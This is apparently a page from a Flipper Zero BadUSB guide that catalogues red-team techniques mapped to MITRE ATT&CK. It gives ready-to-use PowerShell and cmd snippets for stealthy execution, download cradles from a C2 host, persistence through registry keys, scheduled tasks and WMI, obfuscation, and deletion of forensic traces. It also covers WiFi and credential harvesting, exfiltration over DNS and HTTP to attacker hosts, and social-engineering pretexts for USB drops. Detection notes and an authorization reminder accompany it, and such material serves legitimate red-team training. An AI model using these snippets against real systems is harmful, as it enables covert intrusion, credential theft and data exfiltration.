# Red Team Tactics

## Overview

This section covers MITRE ATT&CK-mapped techniques commonly employed in BadUSB engagements. These tactics are provided for authorized red team operations and security research only.

---

## Initial Access Techniques

### T1091 - Replication Through Removable Media

```
┌─────────────────────────────────────────────────────────────────────┐
│ TECHNIQUE: USB Device Planting                                       │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ TACTIC: Plant USB device for payload execution                      │
│                                                                      │
│ DETECTION EVASION:                                                   │
│ ├── Spoof legitimate device VID/PID                                 │
│ │   ID 046D:C52B Logitech:Unifying Receiver                         │
│ │   ID 413C:2107 Dell:Keyboard                                      │
│ │                                                                    │
│ ├── Add human-like typing delays                                    │
│ │   STRING_DELAY 30                                                 │
│ │   (30ms between keystrokes = ~40 WPM)                             │
│ │                                                                    │
│ └── Use common application names in payloads                        │
│     STRING chrome.exe, notepad.exe, etc.                            │
│                                                                      │
│ DELIVERY METHODS:                                                    │
│ ├── USB drop in parking lot                                         │
│ ├── "Lost and found" return                                         │
│ ├── Conference/trade show giveaway                                  │
│ └── Vendor "firmware update" delivery                               │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### T1566.001 - Spearphishing Attachment (USB Variant)

```
┌─────────────────────────────────────────────────────────────────────┐
│ TECHNIQUE: Targeted USB Delivery                                     │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ TACTIC: Provide USB to specific target with "important files"       │
│                                                                      │
│ PAYLOAD: Auto-executes on insertion                                 │
│                                                                      │
│ SOCIAL ENGINEERING PRETEXTS:                                         │
│ ├── "Here are the meeting notes"                                    │
│ ├── "IT asked me to give you this update"                           │
│ ├── "HR sent this for your review"                                  │
│ ├── "The contractor left this for the project"                      │
│ └── "This has the presentation files"                               │
│                                                                      │
│ SUCCESS FACTORS:                                                     │
│ ├── Target research (role, projects, contacts)                      │
│ ├── Timing (busy periods, deadlines)                                │
│ ├── Authority (impersonate IT, management)                          │
│ └── Urgency (time-sensitive content)                                │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Execution Techniques

### T1059.001 - PowerShell Execution

```
┌─────────────────────────────────────────────────────────────────────┐
│ STANDARD (Detectable):                                               │
├─────────────────────────────────────────────────────────────────────┤
│ STRING powershell -c "malicious code"                               │
│                                                                      │
│ Detected by:                                                         │
│ - Script block logging                                               │
│ - Process monitoring                                                 │
│ - Command line auditing                                              │
└─────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────┐
│ EVASION TECHNIQUES:                                                  │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ Hidden Window + Bypass:                                              │
│ STRING powershell -w hidden -ep bypass -nop -c "..."                │
│                                                                      │
│ Base64 Encoded:                                                      │
│ STRING powershell -enc BASE64_ENCODED_COMMAND                       │
│                                                                      │
│ Download Cradle:                                                     │
│ STRING powershell IEX(IWR('http://c2/s.ps1').Content)              │
│                                                                      │
│ AMSI Bypass (requires testing against current protections):         │
│ STRING powershell -c "[Ref].Assembly..."                            │
│                                                                      │
│ Alternative Interpreters:                                            │
│ STRING pwsh -c "..."                (PowerShell 7)                  │
│ STRING wsl bash -c "..."            (Windows Subsystem Linux)       │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### T1059.003 - Windows Command Shell

```
┌─────────────────────────────────────────────────────────────────────┐
│ STANDARD:                                                            │
├─────────────────────────────────────────────────────────────────────┤
│ STRING cmd /c command                                                │
└─────────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────────┐
│ EVASION:                                                             │
├─────────────────────────────────────────────────────────────────────┤
│ STRING cmd /q /c command 2>nul                                      │
│                                                                      │
│ Flags:                                                               │
│ /q  = Quiet mode (no echo)                                          │
│ /c  = Execute and terminate                                         │
│ 2>nul = Suppress error output                                       │
│                                                                      │
│ Alternative Execution:                                               │
│ STRING cmd /v /c "set x=pow && set y=ershell && !x!!y! -c ..."      │
│ (Variable expansion to evade simple pattern matching)                │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

---

## Persistence Techniques

### T1547.001 - Registry Run Keys

```powershell
# Current User (no admin required)
$path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $path -Name "WindowsUpdate" -Value "C:\path\payload.exe"

# Local Machine (requires admin)
$path = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $path -Name "WindowsUpdate" -Value "C:\path\payload.exe"

# RunOnce (executes once, then removes itself)
$path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
Set-ItemProperty -Path $path -Name "Cleanup" -Value "payload.exe"
```

**Detection Indicators:**
- Registry modification events (Sysmon Event ID 13)
- New values in Run/RunOnce keys
- Unusual executable paths

### T1053.005 - Scheduled Task

```powershell
# PowerShell method
$action = New-ScheduledTaskAction -Execute "powershell.exe" `
    -Argument "-w hidden -ep bypass -c code"
$trigger = New-ScheduledTaskTrigger -AtLogon
$principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME
Register-ScheduledTask -TaskName "MicrosoftUpdateCheck" `
    -Action $action -Trigger $trigger -Principal $principal

# schtasks method (legacy)
schtasks /create /tn "MicrosoftUpdate" /tr "payload.exe" /sc onlogon /ru SYSTEM
```

**Detection Indicators:**
- Task creation events (Event ID 4698)
- New XML files in C:\Windows\System32\Tasks
- Unusual trigger configurations

### T1546.003 - WMI Event Subscription

```powershell
# Create WMI event filter
$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
    Name = "ProcessStartFilter"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process'"
}

# Create consumer
$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
    Name = "ProcessStartConsumer"
    CommandLineTemplate = "powershell.exe -w hidden -c code"
}

# Bind filter to consumer
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
    Filter = $filter
    Consumer = $consumer
}
```

**Detection Indicators:**
- WMI subscription events (Sysmon Event ID 19, 20, 21)
- Objects in root\subscription namespace
- Unusual WMI consumers

---

## Defense Evasion Techniques

### T1027 - Obfuscation

```powershell
# String splitting
$a = "power"; $b = "shell"
Invoke-Expression "$a$b -c 'code'"

# Character substitution
$cmd = "powershell" -replace "o","0" -replace "e","3"
# Then reverse at runtime

# Base64 encoding
$code = "Write-Host 'Hello'"
$bytes = [Text.Encoding]::Unicode.GetBytes($code)
$encoded = [Convert]::ToBase64String($bytes)
powershell -enc $encoded

# Concatenation
$x = "Inv"; $y = "oke-"; $z = "Expression"
& ($x+$y+$z) "code"

# Environment variable abuse
$env:x = "powershell"
& $env:x -c "code"
```

### T1070 - Indicator Removal

```powershell
# Clear PowerShell history
Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue

# Clear command history in current session
Clear-History

# Clear Run MRU (Most Recently Used)
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -ErrorAction SilentlyContinue

# Clear recent files
Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue

# Clear temp files
Remove-Item "$env:TEMP\*" -Force -Recurse -ErrorAction SilentlyContinue

# Clear prefetch (requires admin)
Remove-Item "C:\Windows\Prefetch\*" -Force -ErrorAction SilentlyContinue
```

---

## Credential Access Techniques

### T1003 - OS Credential Dumping

```powershell
# WiFi passwords (no admin required)
netsh wlan show profile name="SSID" key=clear

# All WiFi passwords
(netsh wlan show profiles) | Select-String 'All User Profile' |
ForEach-Object { $_.ToString().Split(':')[1].Trim() } |
ForEach-Object { netsh wlan show profile name="$_" key=clear }

# Saved Windows credentials
cmdkey /list

# Browser credential locations (files, not decrypted)
$chrome = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
$firefox = "$env:APPDATA\Mozilla\Firefox\Profiles"
$edge = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
```

### T1056.001 - Keylogging

```
Deployment approach:
1. Drop PowerShell keylogger via BadUSB
2. Configure capture duration
3. Save to temp file for later exfiltration
4. Clean up after exfil

Considerations:
- Duration vs. stealth tradeoff
- File size management
- Secure exfiltration method
```

---

## Exfiltration Techniques

### T1048 - Exfiltration Over Alternative Protocol

```
┌─────────────────────────────────────────────────────────────────────┐
│ DNS EXFILTRATION                                                     │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│ Method:                                                              │
│ 1. Encode data as base64                                            │
│ 2. Chunk into DNS-safe segments                                     │
│ 3. Send as subdomain queries                                        │
│ 4. Controlled DNS server reassembles                                │
│                                                                      │
│ Example:                                                             │
│ base64chunk1.exfil.attacker.com                                     │
│ base64chunk2.exfil.attacker.com                                     │
│                                                                      │
│ PowerShell:                                                          │
│ $data = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($info)) │
│ Resolve-DnsName "$data.exfil.domain.com" -DnsOnly                   │
│                                                                      │
│ Advantages:                                                          │
│ - DNS usually allowed outbound                                      │
│ - Hard to detect in high-volume networks                            │
│ - Works through proxies                                             │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

### T1041 - Exfiltration Over C2 Channel

```powershell
# HTTP POST
Invoke-WebRequest -Uri "https://c2.server/upload" -Method POST -Body $data

# HTTPS with certificate bypass (if needed for testing)
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
Invoke-WebRequest -Uri "https://c2.server/upload" -Method POST -Body $data

# WebClient method
$wc = New-Object System.Net.WebClient
$wc.UploadString("https://c2.server/upload", $data)

# Base64 in URL (small data)
$encoded = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($data))
Invoke-WebRequest "https://c2.server/collect?d=$encoded"
```

---

## Attack Chain Examples

### Quick Reconnaissance Chain

```
INITIAL ACCESS → EXECUTION → COLLECTION → EXFIL

1. USB insertion (T1091)
2. PowerShell execution (T1059.001)
3. System info collection (T1082)
4. Data staging (T1074)
5. Exfiltration (T1041)

Timeline: 10-30 seconds
```

### Persistence Chain

```
INITIAL ACCESS → EXECUTION → PERSISTENCE → CLEANUP

1. USB insertion (T1091)
2. PowerShell execution (T1059.001)
3. Registry persistence (T1547.001)
4. Scheduled task backup (T1053.005)
5. Indicator removal (T1070)

Timeline: 30-60 seconds
```

---

## Quick Reference

```
┌─────────────────────────────────────────────────────────────────────┐
│                    RED TEAM TACTICS QUICK REFERENCE                  │
├─────────────────────────────────────────────────────────────────────┤
│                                                                      │
│  INITIAL ACCESS:                                                     │
│  ├── T1091 - Removable Media                                        │
│  └── T1566.001 - Spearphishing (USB variant)                        │
│                                                                      │
│  EXECUTION:                                                          │
│  ├── T1059.001 - PowerShell                                         │
│  └── T1059.003 - Windows Command Shell                              │
│                                                                      │
│  PERSISTENCE:                                                        │
│  ├── T1547.001 - Registry Run Keys                                  │
│  ├── T1053.005 - Scheduled Task                                     │
│  └── T1546.003 - WMI Event Subscription                             │
│                                                                      │
│  DEFENSE EVASION:                                                    │
│  ├── T1027 - Obfuscation                                            │
│  └── T1070 - Indicator Removal                                      │
│                                                                      │
│  CREDENTIAL ACCESS:                                                  │
│  ├── T1003 - OS Credential Dumping                                  │
│  └── T1056.001 - Keylogging                                         │
│                                                                      │
│  EXFILTRATION:                                                       │
│  ├── T1048 - Alternative Protocol (DNS)                             │
│  └── T1041 - C2 Channel (HTTP/S)                                    │
│                                                                      │
│  ALWAYS REQUIRED:                                                    │
│  ├── Written authorization                                          │
│  ├── Defined scope                                                  │
│  └── Rules of engagement                                            │
│                                                                      │
└─────────────────────────────────────────────────────────────────────┘
```

---

[← Development & Creation](../07_Development_Creation/) | [Back to Flipper Zero](../README.md) | [Next: Blue Team Countermeasures →](../09_Blue_Team_Countermeasures/)
